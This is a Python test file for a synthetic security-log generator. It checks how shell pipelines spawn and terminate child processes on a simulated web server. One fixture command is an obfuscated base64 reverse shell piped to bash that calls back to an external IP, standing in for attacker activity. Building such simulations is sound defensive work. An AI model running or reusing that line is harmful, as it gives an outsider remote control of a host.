from __future__ import annotations

from datetime import UTC, datetime, timedelta
from types import SimpleNamespace
from unittest.mock import Mock

from evidenceforge.generation.engine.typed_handlers.process_pipeline import (
    emit_storyline_linux_pipeline_children,
    linux_pipeline_parent_termination_time,
    terminate_storyline_linux_pipeline_children,
)
from evidenceforge.generation.timing import TimingRuntime
from evidenceforge.models.scenario import System, User


def test_typed_bash_c_pipeline_emits_external_stages_under_authored_shell() -> None:
    start_time = datetime(2026, 11, 2, 14, 20, 10, tzinfo=UTC)
    user = User(username="www-data", full_name="Web Service", email="www-data@example.test")
    system = System(
        hostname="WEB-EXT-01",
        ip="10.10.3.10",
        os="Ubuntu 22.04",
        type="server",
        services=["apache2"],
    )
    state_manager = Mock()
    state_manager.get_processes_on_system.return_value = []
    state_manager.get_process.return_value = None
    activity = SimpleNamespace(
        timing_runtime=TimingRuntime(reference_time=start_time),
        state_manager=state_manager,
        generate_process=Mock(side_effect=[2702832, 2702833]),
        _record_user_process=Mock(),
    )
    runtime = SimpleNamespace(activity_generator=activity, state_manager=state_manager)

    children = emit_storyline_linux_pipeline_children(
        runtime,  # type: ignore[arg-type]
        user=user,
        system=system,
        start_time=start_time,
        logon_id="",
        shell_pid=2702831,
        shell_image="/bin/bash",
        command_line=(
            "bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi "
            "| base64 -d | bash'"
        ),
    )

    assert [(child.image, child.command_line) for child in children] == [
        ("/usr/bin/base64", "base64 -d"),
        ("/bin/bash", "bash"),
    ]
    assert [child.pid for child in children] == [2702832, 2702833]
    assert all(child.start_time > start_time for child in children)
    assert all(
        call.kwargs["parent_pid"] == 2702831 for call in activity.generate_process.call_args_list
    )
    assert all(
        call.kwargs["require_exact_parent"] for call in activity.generate_process.call_args_list
    )
    assert activity._record_user_process.call_count == 2
    assert state_manager.mark_story_process.call_count == 2


def test_flow_owner_lifetime_extends_to_parent_shell_close() -> None:
    start_time = datetime(2026, 11, 2, 14, 20, 10, tzinfo=UTC)
    parent_close = start_time.replace(second=30)
    child = SimpleNamespace(
        pid=2702833,
        image="/bin/bash",
        command_line="bash",
        start_time=start_time,
        lifetime=(1.0, 3.0),
    )
    user = User(username="www-data", full_name="Web Service", email="www-data@example.test")
    system = System(
        hostname="WEB-EXT-01",
        ip="10.10.3.10",
        os="Ubuntu 22.04",
        type="server",
        services=["apache2"],
    )
    activity = SimpleNamespace(
        _remember_foreground_process_finalizer=Mock(),
        generate_process_termination=Mock(),
    )
    runtime = SimpleNamespace(activity_generator=activity)

    terminate_storyline_linux_pipeline_children(
        runtime,  # type: ignore[arg-type]
        children=(child,),
        user=user,
        system=system,
        logon_id="0xabc",
        parent_termination_time=parent_close,
        owner_pid=child.pid,
    )

    activity._remember_foreground_process_finalizer.assert_called_once_with(
        system=system,
        user=user,
        pid=child.pid,
        process_name=child.image,
        logon_id="0xabc",
        termination_time=parent_close - timedelta(milliseconds=100),
    )
    activity.generate_process_termination.assert_not_called()


def test_pipeline_parent_termination_waits_for_exact_child_finalizers() -> None:
    start_time = datetime(2026, 11, 2, 14, 20, 10, tzinfo=UTC)
    child_close = start_time + timedelta(seconds=30)
    user = User(username="www-data", full_name="Web Service", email="www-data@example.test")
    parent = SimpleNamespace(
        pid=2702831,
        parent_pid=23966,
        image="/bin/bash",
        username=user.username,
        logon_id="0xabc",
    )
    child = SimpleNamespace(
        pid=2702833,
        parent_pid=parent.pid,
        concurrency_group_id=(
            "storyline-linux-pipeline:WEB-EXT-01:2702831:2026-11-02T14:20:10+00:00:0"
        ),
        logon_id=parent.logon_id,
    )
    unrelated_child = SimpleNamespace(
        pid=2702834,
        parent_pid=parent.pid,
        concurrency_group_id="baseline-process-group",
    )
    system = System(hostname="WEB-EXT-01", ip="10.10.3.10", os="Ubuntu 22.04", type="server")
    activity = SimpleNamespace(
        foreground_process_termination_time=Mock(return_value=child_close),
    )
    runtime = SimpleNamespace(
        activity_generator=activity,
        state_manager=SimpleNamespace(
            get_processes_on_system=Mock(return_value=[child, unrelated_child])
        ),
    )

    parent_close = linux_pipeline_parent_termination_time(
        runtime,  # type: ignore[arg-type]
        system=system,
        shell_pid=parent.pid,
        requested_time=start_time + timedelta(seconds=14),
    )

    assert parent_close > child_close
    activity.foreground_process_termination_time.assert_called_once_with(system.hostname, child.pid)
